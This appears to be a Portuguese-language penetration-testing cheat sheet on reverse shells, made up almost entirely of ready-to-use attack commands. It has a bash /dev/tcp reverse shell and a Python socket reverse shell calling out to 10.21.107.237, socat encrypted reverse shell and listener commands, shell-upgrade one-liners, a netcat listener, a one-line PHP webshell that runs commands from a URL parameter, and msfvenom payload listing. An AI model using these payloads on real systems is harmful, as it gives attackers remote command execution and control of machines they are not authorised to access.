- **Reverse Shells**:
```bash
https://www.revshells.com/?source=post_page-----ae216e7a836f---------------------------------------
```
# 🖥 Shells Reversas

## 🖥 Bash
```bash
cat << 'EOF' > test
#!/bin/bash
bash -i >& /dev/tcp/10.21.107.237/80 0>&1
EOF
```

## 🐍 Python
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.21.107.237",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## 🔐 Shell reversa criptografada com SOCAT
### 🔹 Gerar chaves
```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem
```

### 🔹 Listener criptografado
```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```

### 🔹 Reverse shell no alvo
```bash
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

---

# 🔥 Melhorando Shells
## 🛠️ Melhorando Shells
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```
## 🪟Windows
```bash
apt install rlwrap
rlwrap nc -lvnp <port>
```

---



## 📌Exemplo de Webshell em PHP
```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

## 📌Metasploit Payloads
```bash
msfvenom -l payloads | grep "windows"
https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1
```
